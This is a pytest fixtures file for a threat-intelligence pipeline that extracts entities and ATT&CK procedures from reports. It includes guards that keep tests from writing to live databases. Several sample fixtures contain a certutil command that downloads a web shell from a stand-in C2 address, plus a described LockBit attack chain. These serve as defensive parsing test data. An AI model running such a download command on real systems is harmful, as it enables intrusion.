"""Shared test fixtures for the extraction pipeline."""

import sys
from pathlib import Path
from dataclasses import asdict

import pytest
from unittest.mock import AsyncMock, patch

# Add backend to path
sys.path.insert(0, str(Path(__file__).parent.parent / "backend"))

from app.graph.state import (
    Channel,
    Entity,
    EntityType,
    GateAction,
    PipelineStatus,
    ProcedureDraft,
    SourceType,
    TechniqueMapping,
)


# Point Settings.attack_stix_path at the repo's local data dir so tests can
# load the ATT&CK catalogue. The default is /data/attack/... (the docker
# bind-mount path) which doesn't exist on the host running pytest. Done at
# import time so any module that reads settings.attack_stix_path during its
# own import (e.g. nodes that build module-level constants from the catalogue)
# gets the right path.
_LOCAL_ATTACK_PATH = (
    Path(__file__).parent.parent / "data" / "attack" / "enterprise-attack-19.2.json"
)
if _LOCAL_ATTACK_PATH.exists():
    from app.config import settings
    settings.attack_stix_path = str(_LOCAL_ATTACK_PATH)
    # Clear any singletons that may have been built with the old default path.
    from app.services import attack_data as _attack_data_mod
    _attack_data_mod._instance = None
    from app.services import procedure_matcher as _matcher_mod
    _matcher_mod._index_cache = None

# Use the lightweight token_overlap retriever for tests. The default
# "embedding" retriever requires sentence-transformers + a ~570 MB
# SecureBERT 2.0 download, which is overkill for unit/integration tests.
from app.config import settings as _settings
_settings.technique_retriever = "token_overlap"

# Never let the unit suite reach Neo4j. `distribute` is gated on
# settings.neo4j_writes_enabled, which pydantic reads from .env — so the day
# that flag was set to true for real use, the suite started opening a live
# bolt connection and attempting real writes. It surfaced as an event-loop
# error rather than as pollution, which is luck: on a different ordering the
# write succeeds and `malware--001` and friends land in the graph.
#
# Deliberately not a fixture. distribute() reads the flag at call time, and
# module-level constants are built at import; forcing it here means no test
# can opt back in by accident.
_settings.neo4j_writes_enabled = False



@pytest.fixture
def sample_text():
    """Realistic threat intel free text for testing."""
    return (
        "LockBit 3.0 ransomware actors exploited CVE-2023-46604, a remote code "
        "execution vulnerability in Apache ActiveMQ, to gain initial access to "
        "healthcare networks. Following exploitation, the actors used certutil.exe "
        "to download a web shell from their C2 server at 203.0.113.10. The web "
        "shell was placed in the ActiveMQ webapps directory. Subsequently, PowerShell "
        "was used to download and execute a Cobalt Strike beacon, establishing "
        "persistent command and control. The actors then used Mimikatz for credential "
        "harvesting before deploying LockBit ransomware across the network."
    )


@pytest.fixture
def sample_html():
    """Realistic threat advisory HTML."""
    return (
        "<html><body><article>"
        "<h1>ActiveMQ CVE-2023-46604 Exploitation</h1>"
        "<p>LockBit 3.0 actors exploited a remote code execution vulnerability "
        "in Apache ActiveMQ to deploy ransomware across healthcare networks. "
        "The initial exploit leveraged ClassInfo deserialization to execute "
        "shell commands on the ActiveMQ broker.</p>"
        "<h2>Command Lines</h2>"
        "<pre>certutil.exe -urlcache -split -f http://203.0.113.10/shell.jsp</pre>"
        "</article></body></html>"
    )


@pytest.fixture
def sample_markdown():
    """Realistic threat report in markdown."""
    return (
        "# Threat Report: ActiveMQ Exploitation\n\n"
        "## Summary\n\n"
        "The **LockBit 3.0** threat actor exploited *CVE-2023-46604* to gain access.\n\n"
        "## Command Lines\n\n"
        "```\n"
        "certutil.exe -urlcache -split -f http://203.0.113.10/shell.jsp\n"
        "```\n\n"
        "## IOCs\n\n"
        "| Type | Value |\n"
        "|------|-------|\n"
        "| IP | 203.0.113.10 |\n"
        "| Hash | a1b2c3d4e5f6 |\n"
    )


@pytest.fixture
def sample_entities():
    """Validated entities for downstream node testing."""
    return [
        asdict(Entity(
            entity_id="ent-001",
            entity_type=EntityType.INTRUSION_SET.value,
            value="LockBit 3.0",
            confidence=0.92,
            gate_action=GateAction.APPROVE.value,
        )),
        asdict(Entity(
            entity_id="ent-002",
            entity_type=EntityType.MALWARE.value,
            value="Cobalt Strike",
            confidence=0.88,
            gate_action=GateAction.APPROVE.value,
        )),
        asdict(Entity(
            entity_id="ent-003",
            entity_type=EntityType.TOOL.value,
            value="certutil.exe",
            confidence=0.95,
            gate_action=GateAction.APPROVE.value,
        )),
        asdict(Entity(
            entity_id="ent-004",
            entity_type=EntityType.IOC_IP.value,
            value="203.0.113.10",
            confidence=0.85,
            gate_action=GateAction.APPROVE.value,
        )),
        asdict(Entity(
            entity_id="ent-005",
            entity_type=EntityType.CAMPAIGN.value,
            value="ActiveMQ exploitation wave",
            confidence=0.80,
            gate_action=GateAction.APPROVE.value,
        )),
        asdict(Entity(
            entity_id="ent-006",
            entity_type=EntityType.VULNERABILITY.value,
            value="CVE-2023-46604",
            confidence=1.0,
            gate_action=GateAction.APPROVE.value,
        )),
    ]


@pytest.fixture
def sample_drafts():
    """Procedure drafts for normalization/serialization testing."""
    drafts = [
        asdict(ProcedureDraft(
            draft_id="dft-001",
            chunk_id="chk-001",
            name="Exploit Apache ActiveMQ via CVE-2023-46604",
            description="The threat actor exploited CVE-2023-46604 to gain initial access.",
            techniques=[TechniqueMapping(
                technique_id="T1190",
                stix_id="attack-pattern--df8aa4fa-9947-4729-879a-b5d53e461be2",
                technique_name="Exploit Public-Facing Application",
                tactic="initial-access",
                confidence=0.87,
            )],
            platforms=["linux::server", "windows::server"],
            confidence=87,
            sequence_index=1,
            first_observed="2023-10-25T00:00:00Z",
        )),
        asdict(ProcedureDraft(
            draft_id="dft-002",
            chunk_id="chk-002",
            name="Download web shell via certutil",
            description="The actor used certutil.exe to download a web shell from the C2 server.",
            techniques=[
                TechniqueMapping(stix_id="attack-pattern--8d267313-c6e0-4b7b-811e-f96930c889ec", technique_id="T1059.003", technique_name="Windows Command Shell", tactic="execution", confidence=0.82),
                TechniqueMapping(stix_id="attack-pattern--66f5262d-8372-4b9a-8f2c-435dddf23161", technique_id="T1105", technique_name="Ingress Tool Transfer", tactic="command-and-control", confidence=0.79),
            ],
            platforms=["windows::server"],
            command_lines=["certutil.exe -urlcache -split -f http://203.0.113.10/shell.jsp"],
            confidence=79,
            sequence_index=2,
            predecessor_indices=[1],
        )),
        asdict(ProcedureDraft(
            draft_id="dft-003",
            chunk_id="chk-003",
            name="Execute Cobalt Strike beacon via PowerShell",
            description="PowerShell was used to download and execute a Cobalt Strike beacon.",
            techniques=[TechniqueMapping(
                technique_id="T1059.001",
                stix_id="attack-pattern--be32d939-41ba-477a-82eb-5760554be4c8",
                technique_name="powershell",
                tactic="execution",
                confidence=0.75,
            )],
            platforms=["windows::server"],
            confidence=72,
            sequence_index=3,
            predecessor_indices=[2],
            detail_gap=True,
        )),
    ]
    # Add raw_command_lines to the second draft for testing
    drafts[1]["raw_command_lines"] = drafts[1].get("command_lines", [])
    # Add procedure_type to all drafts (defaults to "reporting" in serializer)
    for draft in drafts:
        draft["procedure_type"] = "reporting"
    return drafts



@pytest.fixture(autouse=True)
def _never_persist_bundles_from_tests():
    """Stop the test suite writing bundles into the real database.

    `distribute` persists every bundle it builds via bundle_store, using the
    app's own async_session — which points at whatever DATABASE_URL is in
    .env, i.e. the dev Postgres. Any test that reaches that node therefore
    left a row behind, silently, on every run.

    That was not theoretical: a flush of the dev database found that
    nearly every stored bundle was test residue — including many titled "graph
    execution test" after the fixture in test_graph_execution.py.

    Autouse and in conftest on purpose: an opt-in guard is one the next test
    to drive the pipeline will forget. A test that genuinely wants to assert
    on persistence can patch save_bundle itself — an inner patch wins.
    """
    with patch(
        "app.services.bundle_store.save_bundle", new=AsyncMock()
    ) as stub:
        yield stub

@pytest.fixture(autouse=True)
def _never_record_surfacings_from_tests():
    """Stop the test suite writing rows into the real feedback ledger.

    Same failure as `_never_persist_bundles_from_tests` above, one table
    over. `relevant_addendum_cached` writes a FeedbackPatternSurfacing row
    per surfaced pattern through the app's own async_session, so any test
    that drives a real LLM node leaves rows behind in the dev Postgres.

    Measured: a full `pytest` at the repo root added rows to
    `feedback_pattern_surfacings` on every run, attributed to a source_id
    with no `sources` row. It is order-dependent — no single file reproduces
    it, and neither half of the suite does — which is exactly why the guard
    is autouse rather than applied at the one call site someone identifies.

    This matters more than stray rows: those surfacings are the flywheel's
    own evidence ledger. Test residue there is measurement contamination,
    inflating surfacing counts and adding source_ids that can never be
    joined back to a source.

    A test that genuinely wants to assert on the ledger can patch
    `_record_surfacings` itself — an inner patch wins.
    """
    with patch(
        "app.services.feedback_patterns._record_surfacings", new=AsyncMock()
    ) as stub:
        yield stub


@pytest.fixture
def base_state(sample_text, sample_entities, sample_drafts):
    """Full pipeline state with all fields populated for testing."""
    return {
        "source_id": "src-test-001",
        "channel": Channel.MANUAL.value,
        "source_type": SourceType.FREE_TEXT.value,
        "raw_content_path": sample_text,
        "metadata": {"author": "Test Author", "publication_date": "2023-11-15"},
        "source_reliability": 85,
        "gates_enabled": True,
        "status": PipelineStatus.QUEUED.value,
        "current_node": "",
        "error": None,
        "entities": sample_entities,
        "detection_rules": [],
        "validated_entities": sample_entities,
        "classified_sections": [],
        "chunks": [],
        "technique_mappings": {},
        "drafts": sample_drafts,
        "gate1_decisions": [{"draft_id": d["draft_id"], "action": "approve"} for d in sample_drafts],
        "gate1_approved_draft_ids": [d["draft_id"] for d in sample_drafts],
        "gate1_rejection_routing": None,
        "gate2_decision": {"approved": True, "feedback": None},
    }
